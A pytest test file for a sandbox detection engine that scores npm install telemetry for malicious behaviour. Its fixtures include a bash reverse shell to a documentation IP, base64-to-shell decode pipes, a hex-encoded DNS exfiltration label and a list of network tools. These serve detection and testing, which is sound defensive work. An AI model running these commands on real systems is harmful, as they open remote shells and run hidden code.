from pathlib import Path

import pytest

from brain.rules import Severity, domain_allowed, evaluate, is_external, max_severity
from shared.contract import ConnectEvent, DetonateResult, DnsQuery, ExecEvent

FIXTURES = Path(__file__).parent / "fixtures"
NPM = "/usr/local/bin/node"


def exec_event(binary: str, args: str, pid: int = 200, parent: str | None = "/bin/sh"):
    return ExecEvent(
        ts="2026-11-01T15:00:00Z",
        pid=pid,
        ppid=1,
        binary=binary,
        args=args,
        parent_binary=parent,
        uid=10001,
    )


def connect(daddr: str, dport: int = 443, domain: str | None = None, binary: str = NPM):
    return ConnectEvent(
        ts="2026-11-01T15:00:00Z",
        pid=300,
        binary=binary,
        daddr=daddr,
        dport=dport,
        family="AF_INET",
        resolved_domain=domain,
    )


def result(execs=(), connects=()) -> DetonateResult:
    return DetonateResult(
        job_id="t",
        status="completed",
        exit_code=0,
        duration_s=1.0,
        exec_events=list(execs),
        connect_events=list(connects),
        dns_queries=[],
        stdout_tail="",
        stderr_tail="",
    )


def rule_ids(res: DetonateResult) -> set[str]:
    return {h.rule_id for h in evaluate(res)}


# --- E4 fixture end to end ---


def test_e4_fixture_fires_raw_ip_and_net_tool_only():
    res = DetonateResult.model_validate_json((FIXTURES / "detonate_result_e4.json").read_text())
    hits = evaluate(res)
    assert {h.rule_id for h in hits} == {"NET_RAW_IP", "EXEC_NET_TOOL"}
    assert max_severity(hits) == Severity.HIGH
    raw = next(h for h in hits if h.rule_id == "NET_RAW_IP")
    assert "203.0.113.10:80" in raw.evidence


# --- benign baselines ---


@pytest.mark.parametrize(
    "args",
    [
        "-c node install.js",
        "-c node-gyp rebuild",
        "-c tsc -p .",
        "-c husky install",
        "-c node ./scripts/postinstall.js --silent -i",  # -i after -c belongs to the script
    ],
)
def test_npm_sh_c_wrapper_alone_does_not_fire(args):
    res = result(
        execs=[
            exec_event(NPM, "/usr/local/bin/npm install", pid=101, parent=None),
            exec_event("/bin/sh", args, parent=NPM),
        ],
        connects=[connect("104.16.24.34", domain="registry.npmjs.org")],
    )
    assert evaluate(res) == []


def test_empty_result_is_none():
    assert max_severity(evaluate(result())) == Severity.NONE


def test_truncated_telemetry_is_never_clean():
    res = result().model_copy(update={"truncated": True})
    hits = evaluate(res)
    assert [(h.rule_id, h.severity) for h in hits] == [("TELEMETRY_TRUNCATED", Severity.LOW)]


# --- network ---


def test_raw_ip_fires_for_test_net_demo_address():
    hits = evaluate(result(connects=[connect("203.0.113.10", 80)]))
    assert [h.rule_id for h in hits] == ["NET_RAW_IP"]
    assert hits[0].severity == Severity.HIGH


@pytest.mark.parametrize(
    "addr",
    ["10.0.0.5", "172.17.0.1", "192.168.1.1", "169.254.169.254", "fe80::1"],
)
def test_internal_destinations_flagged(addr):
    hits = evaluate(result(connects=[connect(addr)]))
    assert [(h.rule_id, h.severity) for h in hits] == [("NET_INTERNAL_TARGET", Severity.HIGH)]


def test_metadata_probe_named_in_evidence():
    hit = evaluate(result(connects=[connect("169.254.169.254", 80)]))[0]
    assert "cloud metadata service" in hit.evidence


def test_public_domain_resolving_to_private_ip_is_downgraded():
    # taro.jd.com legitimately resolves to RFC1918 in public DNS; the install reached the
    # address its resolver chose, not a hardcoded internal host. Needs-review, not Blocked.
    hits = evaluate(result(connects=[connect("172.28.56.182", domain="taro.jd.com")]))
    assert [(h.rule_id, h.severity) for h in hits] == [("NET_INTERNAL_TARGET", Severity.LOW)]
    assert "taro.jd.com" in hits[0].evidence


@pytest.mark.parametrize("addr", ["169.254.169.254", "169.254.170.2", "fe80::1"])
def test_rebinding_to_metadata_or_link_local_stays_high(addr):
    # A domain pointing at the metadata service / link-local is DNS rebinding — never downgrade.
    hits = evaluate(result(connects=[connect(addr, domain="evil.example.com")]))
    assert [(h.rule_id, h.severity) for h in hits] == [("NET_INTERNAL_TARGET", Severity.HIGH)]


def test_raw_private_literal_without_dns_stays_high():
    # No forward DNS name => a direct internal pivot, not a CDN that resolves to a private IP.
    hits = evaluate(result(connects=[connect("10.0.0.5", domain=None)]))
    assert [(h.rule_id, h.severity) for h in hits] == [("NET_INTERNAL_TARGET", Severity.HIGH)]


@pytest.mark.parametrize("addr", ["127.0.0.1", "::1"])
def test_loopback_ignored(addr):
    assert evaluate(result(connects=[connect(addr)])) == []


def test_tcp_dns_to_the_chamber_resolver_ignored():
    assert evaluate(result(connects=[connect("10.250.0.1", 53)])) == []
    assert rule_ids(result(connects=[connect("10.250.0.1", 22)])) == {"NET_INTERNAL_TARGET"}


def dns_result(*domains: str) -> DetonateResult:
    res = result()
    queries = [DnsQuery(ts="t", domain=d, answers=[]) for d in domains]
    return res.model_copy(update={"dns_queries": queries})


def test_hex_encoded_dns_label_flagged():
    # Real m11 eval payload: npm user agent hex-encoded into labels.
    domain = (
        "6e706d2f31302e382e32206e6f64652f7632302e32302e32206c696e7578"
        ".2078363420776f726b7370616365732f66616c7365.exfil.invalid"
    )
    hits = evaluate(dns_result(domain))
    assert [(h.rule_id, h.severity) for h in hits] == [("DNS_ENCODED_LABEL", Severity.HIGH)]


@pytest.mark.parametrize(
    "domain",
    [
        "registry.npmjs.org",
        "release-assets.githubusercontent.com",
        "playwright.download.prss.microsoft.com",
        "d1a2b3c4d5e6f7.cloudfront.net",  # short CDN hash label
        "my-internal-load-balancer-for-the-staging-env.example.com",  # long but words
    ],
)
def test_ordinary_dns_names_not_flagged(domain):
    assert evaluate(dns_result(domain)) == []


def test_short_hex_dns_label_is_flagged_w15():
    """W15: the held-out bc08 hex-encodes a short identifier into a 24-char label, which was
    under the old 40-char floor and slipped past. An all-hex label is a strong exfil signal, so
    it now trips at 20 chars. Measured 0 benign false positives across 742 recorded installs."""
    # bc08's exact recorded label (24 hex chars).
    domain = "613334386439643930336132.collector.invalid"
    hits = evaluate(dns_result(domain))
    assert [(h.rule_id, h.severity) for h in hits] == [("DNS_ENCODED_LABEL", Severity.HIGH)]


@pytest.mark.parametrize(
    "label",
    [
        "d1a2b3c4d5e6f7",  # 14-char hex CDN hash — benign, below the floor
        "a1b2c3",  # short hex
        "abc123def",  # 9 chars
        "0123456789abcdef",  # 16 hex, still below the 20 floor
    ],
)
def test_short_hex_labels_below_the_floor_are_not_flagged(label):
    """The floor protects legitimate short hex subdomains (CDN hashes). Anything under 20 all-hex
    chars stays quiet, so the common benign case is unaffected."""
    assert evaluate(dns_result(f"{label}.cloudfront.net")) == []


def test_the_digit_heuristic_still_needs_the_long_floor():
    """Only the *all-hex* path got the lower floor. A label that is merely digit-heavy (a cache
    key with letters) still needs the conservative 40-char floor, so a 24-char mixed label does
    not trip."""
    mixed = "abc123def456ghi789jkl012"  # 24 chars, ~50% digits, not all-hex
    assert evaluate(dns_result(f"{mixed}.cloudfront.net")) == []


def test_ipv4_mapped_ipv6_is_classified_by_ipv4():
    assert not is_external("::ffff:127.0.0.1")
    assert is_external("::ffff:203.0.113.10")


def test_allowed_cidr_suppresses_raw_ip():
    res = result(connects=[connect("140.82.112.3")])
    assert rule_ids(res) == {"NET_RAW_IP"}
    assert evaluate(res, allowed_cidrs=("140.82.112.0/20",)) == []


def test_unlisted_domain_is_low():
    hits = evaluate(result(connects=[connect("93.184.215.14", domain="evil.example")]))
    assert [(h.rule_id, h.severity) for h in hits] == [("NET_UNLISTED_DOMAIN", Severity.LOW)]


@pytest.mark.parametrize(
    "domain, allowed",
    [
        ("registry.npmjs.org", True),
        ("rdns:lb-140-82-112-3-iad.github.com", True),
        ("GitHub.com.", True),
        ("evilgithub.com", False),
        ("github.com.evil.example", False),
        ("rdns:registry.npmjs.org.attacker.net", False),
    ],
)
def test_domain_allowlist_suffix_matching(domain, allowed):
    assert domain_allowed(domain, ("github.com", "registry.npmjs.org")) is allowed


# --- exec ---


@pytest.mark.parametrize(
    "binary",
    [
        "/usr/bin/curl",
        "/usr/bin/wget",
        "/bin/nc",
        "/usr/bin/ncat",
        "/usr/bin/socat",
        "/bin/nc.openbsd",
    ],
)
def test_net_tools_fire(binary):
    assert rule_ids(result(execs=[exec_event(binary, "http://x")])) == {"EXEC_NET_TOOL"}


@pytest.mark.parametrize(
    "binary, args",
    [
        ("/bin/bash", "-i"),
        ("/bin/sh", "-i"),
        ("/bin/bash", "-ic id"),
        ("/bin/bash", "-c bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"),
        ("/usr/local/bin/node", "-e require('fs').openSync('/dev/udp/1.2.3.4/53')"),
    ],
)
def test_interactive_shell_is_critical(binary, args):
    hits = evaluate(result(execs=[exec_event(binary, args)]))
    assert [h.rule_id for h in hits] == ["EXEC_INTERACTIVE_SHELL"]
    assert hits[0].severity == Severity.CRITICAL


def test_non_shell_with_dash_i_does_not_fire():
    assert evaluate(result(execs=[exec_event("/usr/bin/grep", "-i foo file")])) == []


@pytest.mark.parametrize(
    "args",
    [
        "-c echo ZWNobyBoaQ== | base64 -d | sh",
        "-c echo ZWNobyBoaQ== | base64 --decode | /bin/bash",
        "-c printf %s ZWNo | base64 -di | bash",
        '-c eval "$(echo ZWNobyBoaQ== | base64 -d)"',
    ],
)
def test_decode_pipe_fires(args):
    assert "EXEC_DECODE_PIPE" in rule_ids(result(execs=[exec_event("/bin/sh", args)]))


def test_base64_decode_without_shell_does_not_fire():
    assert evaluate(result(execs=[exec_event("/bin/sh", "-c base64 -d in.b64 > out.bin")])) == []


def test_unbalanced_quotes_in_args_do_not_crash():
    hits = evaluate(result(execs=[exec_event("/bin/bash", "-i 'unterminated")]))
    assert [h.rule_id for h in hits] == ["EXEC_INTERACTIVE_SHELL"]


# --- e5-like chain and ordering ---


def test_e5_chain_sorted_most_severe_first():
    res = result(
        execs=[
            exec_event("/usr/local/bin/node", "postinstall.js", pid=150, parent="/bin/sh"),
            exec_event(
                "/bin/bash",
                "-c bash -i >& /dev/tcp/203.0.113.10/4444 0>&1",
                pid=151,
                parent="/usr/local/bin/node",
            ),
        ],
        connects=[connect("203.0.113.10", 4444, binary="/bin/bash")],
    )
    hits = evaluate(res)
    assert hits[0].rule_id == "EXEC_INTERACTIVE_SHELL"
    assert {h.rule_id for h in hits} == {"EXEC_INTERACTIVE_SHELL", "NET_RAW_IP"}
    assert max_severity(hits) == Severity.CRITICAL


# --- dropped binaries and exfil services (motivated by real-incident reconstructions) ---


@pytest.mark.parametrize(
    "binary",
    ["/tmp/th/trufflehog", "/home/runner/.cache/x/miner", "/dev/shm/a", "/var/tmp/b"],
)
def test_binary_run_from_temp_or_home_flagged(binary):
    hits = evaluate(result(execs=[exec_event(binary, "filesystem /work --json")]))
    assert [(h.rule_id, h.severity) for h in hits] == [("EXEC_DROPPED_BINARY", Severity.HIGH)]


@pytest.mark.parametrize(
    "binary",
    [
        "/work/node_modules/esbuild/bin/esbuild",  # shipped in the package (eval: esbuild)
        "/work/node_modules/.bin/prebuild-install",
        "/tmp/.npm/_npx/abc/node_modules/.bin/tool",  # npx from npm's own cache
        "/usr/bin/tar",
    ],
)
def test_package_and_system_binaries_not_flagged(binary):
    assert evaluate(result(execs=[exec_event(binary, "")])) == []


def test_exfil_service_connect_flagged_once_with_pid():
    res = result(connects=[connect("198.51.100.66", 443, domain="webhook.site"),
                           connect("198.51.100.66", 80, domain="webhook.site")])  # fmt: skip
    exfil = [h for h in evaluate(res) if h.rule_id == "NET_EXFIL_SERVICE"]
    assert len(exfil) == 1 and exfil[0].pid == 300 and exfil[0].severity == Severity.HIGH
    assert "request catcher" in exfil[0].evidence


def test_exfil_service_lookup_alone_flagged():
    hits = evaluate(dns_result("abc123.oast.fun"))
    assert [(h.rule_id, h.target) for h in hits] == [("NET_EXFIL_SERVICE", "oast.fun")]


@pytest.mark.parametrize("domain", ["notwebhook.site", "webhook.site.example.com", "ipinfo.iox"])
def test_exfil_service_match_is_exact_or_subdomain(domain):
    assert evaluate(dns_result(domain)) == []


# --- planted credential bait (file events from the credential-files Tetragon policy) ---

from shared.contract import FileEvent  # noqa: E402


def bait_result(opener_pid: int) -> DetonateResult:
    execs = [
        exec_event("/usr/local/bin/node", "/usr/local/bin/npm install", pid=10, parent=None),
        ExecEvent(ts="t", pid=20, ppid=10, binary="/usr/bin/sh", args='-c "node bundle.js"',
                  parent_binary="/usr/local/bin/node", uid=10001),
        ExecEvent(ts="t", pid=30, ppid=20, binary="/usr/local/bin/node", args="bundle.js",
                  parent_binary="/usr/bin/sh", uid=10001),
    ]  # fmt: skip
    files = [FileEvent(ts="t", pid=opener_pid, binary="/usr/local/bin/node",
                       path="/home/runner/.npmrc")]  # fmt: skip
    return result(execs=execs).model_copy(update={"file_events": files})


def test_install_script_opening_bait_is_high():
    hits = evaluate(bait_result(30))
    assert [(h.rule_id, h.severity, h.pid) for h in hits] == [
        ("CRED_FILE_ACCESS", Severity.HIGH, 30)
    ]
    assert "~/.npmrc" in hits[0].evidence


def test_npm_itself_reading_npmrc_is_normal():
    assert evaluate(bait_result(10)) == []


def test_nested_npm_run_reading_npmrc_is_not_credential_theft():
    # Real re2 install: install-from-cache spawns `npm run verify-build`, a nested npm that
    # reads ~/.npmrc as config. It descends from a lifecycle shell but must not fire.
    res = DetonateResult.model_validate_json((FIXTURES / "detonate_real_re2.json").read_text())
    assert "CRED_FILE_ACCESS" not in {h.rule_id for h in evaluate(res)}


# --- EXEC_DROPPED_BINARY via an interpreter (rt09: `sh /tmp/stage.sh`) ---


def with_cwd(event: ExecEvent, cwd: str | None) -> ExecEvent:
    return event.model_copy(update={"cwd": cwd})


@pytest.mark.parametrize(
    "binary, args, cwd",
    [
        ("/usr/bin/sh", "/tmp/stage.sh", "/work"),  # rt09 exactly
        ("/bin/bash", "-e /dev/shm/x", "/work"),  # options before the operand
        ("/usr/local/bin/node", "/home/runner/.cache/p.js arg", "/work"),
        ("/usr/bin/python3.11", "x.py", "/tmp/stage"),  # relative to the kernel's cwd
        ("/usr/bin/sh", "../../../tmp/s.sh", "/work/node_modules/pkg"),  # traversal normalized
        ("/usr/bin/perl", "/var/tmp/p.pl", None),
    ],
)
def test_interpreter_running_a_dropped_script_fires(binary, args, cwd):
    res = result([with_cwd(exec_event(binary, args), cwd)])
    assert "EXEC_DROPPED_BINARY" in rule_ids(res)


@pytest.mark.parametrize(
    "binary, args, cwd",
    [
        ("/usr/bin/sh", "-c /tmp/looks-like-a-path", "/work"),  # inline command, not a file
        ("/bin/bash", "-ec 'echo hi'", "/work"),
        ("/usr/local/bin/node", "-e require('/tmp/x')", "/work"),
        ("/usr/bin/python3", "-m pip --version", "/tmp"),
        ("/usr/local/bin/node", "/work/node_modules/re2/scripts/verify-build.js", "/work"),
        ("/usr/local/bin/node", "/tmp/.npm/_npx/abc/node_modules/.bin/x", "/work"),  # npm cache
        ("/usr/bin/sh", "scripts/install.sh", "/work/node_modules/pkg"),  # the package's own
        ("/usr/bin/sh", "../../tmp/s.sh", "/work/node_modules/pkg"),  # resolves to /work/tmp
        ("/usr/bin/sh", "x.sh", None),  # relative with no cwd: can't resolve, don't guess
        ("/usr/bin/make", "/tmp/Makefile", "/work"),  # not an interpreter we model
    ],
)
def test_ordinary_script_runs_do_not_fire(binary, args, cwd):
    res = result([with_cwd(exec_event(binary, args), cwd)])
    assert "EXEC_DROPPED_BINARY" not in rule_ids(res)


def test_recorded_real_detonations_gain_no_dropped_script_hits():
    # re2 is a real native build; dep/r01 run package scripts from node_modules.
    for name in ("detonate_real_re2.json", "detonate_real_dep.json", "detonate_real_r01.json",
                 "detonate_real_e4.json", "detonate_real_e5.json"):  # fmt: skip
        res = DetonateResult.model_validate_json((FIXTURES / name).read_text())
        hits = [h for h in evaluate(res) if h.rule_id == "EXEC_DROPPED_BINARY"]
        assert hits == [], name
